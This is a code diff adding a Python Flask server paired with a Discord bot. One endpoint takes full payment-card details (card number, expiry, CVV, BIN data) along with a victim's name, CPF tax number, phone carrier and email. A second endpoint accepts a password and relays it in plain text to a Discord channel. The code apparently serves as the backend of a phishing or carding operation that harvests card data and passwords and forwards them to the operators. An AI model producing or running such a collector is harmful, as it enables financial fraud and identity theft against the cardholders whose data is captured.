@@ -1,0 +1,111 @@
+import os
+import asyncio
+from flask import Flask, request, jsonify
+import discord
+from discord.ext import commands
+from model.cardModel import Card
+
+app = Flask(__name__)
+
+# Get Discord bot token and channel ID from environment variables
+DISCORD_TOKEN = os.getenv("TOKEN")
+try:
+    CHANNEL_ID = int(os.getenv("CHANNEL_ID", "0"))
+except ValueError:
+    CHANNEL_ID = 0
+
+# Configure Discord bot with all intents
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix="/", intents=intents)
+
+# In-memory storage for Card objects
+cards: list[Card] = []
+
+@app.route('/auth', methods=['POST'])
+def auth_info():
+    """
+    Receives card information and creates a new Card instance.
+    Expected JSON fields:
+      celular, operadora, valor, email, nome, cpf, card, mes, ano, cvv, token, bin, dadosbin
+    """
+    try:
+        data = request.json
+        required_fields = [
+            'celular', 'operadora', 'valor', 'email', 'nome', 'cpf',
+            'card', 'mes', 'ano', 'cvv', 'token', 'bin', 'dadosbin'
+        ]
+        if not data or not all(field in data for field in required_fields):
+            return jsonify({'Error': 'Missing required fields'}), 400
+
+        new_card = Card(
+            data['celular'],
+            data['operadora'],
+            data['valor'],
+            data['email'],
+            data['nome'],
+            data['cpf'],
+            data['card'],
+            data['mes'],
+            data['ano'],
+            data['cvv'],
+            data['token'],
+            data['bin'],
+            data['dadosbin']
+        )
+        cards.append(new_card)
+
+        return jsonify({'Message': 'Card added successfully'}), 200
+
+    except Exception as ex:
+        print("Error in /auth endpoint:", ex)
+        return jsonify({'Error': 'Internal Server Error'}), 500
+
+@app.route('/authpass', methods=['POST'])
+def auth_password():
+    """
+    Receives a password and a token.
+    If a Card instance matching the token is found, sends a Discord message.
+    Expected JSON fields: senha, token
+    """
+    try:
+        data = request.json
+        if not data or not all(key in data for key in ['senha', 'token']):
+            return jsonify({'Error': 'Missing required fields'}), 400
+
+        senha = data['senha']
+        token_received = data['token']
+        message_sent = False
+
+        # Search for the Card instance that matches the token
+        for card in cards:
+            if card.token == token_received:
+                # If CHANNEL_ID is set and we can get the channel, send a message to Discord.
+                if CHANNEL_ID:
+                    channel = bot.get_channel(CHANNEL_ID)
+                    if channel:
+                        # Schedule the sending of the Discord message in the bot's event loop.
+                        asyncio.run_coroutine_threadsafe(
+                            channel.send(f"Received password: {senha}"),
+                            bot.loop
+                        )
+                        message_sent = True
+                break
+
+        return jsonify({'Message': 'Authentication processed', 'messageSent': message_sent}), 200
+
+    except Exception as ex:
+        print("Error in /authpass endpoint:", ex)
+        return jsonify({'Error': 'Internal Server Error'}), 500
+
+def run_flask():
+    # Run the Flask server
+    app.run(host="0.0.0.0", port=5000)
+
+if __name__ == "__main__":
+    import threading
+    # Run Flask app in a separate thread
+    flask_thread = threading.Thread(target=run_flask)
+    flask_thread.start()
+
+    # Start the Discord bot (this call is blocking)
+    bot.run(DISCORD_TOKEN)
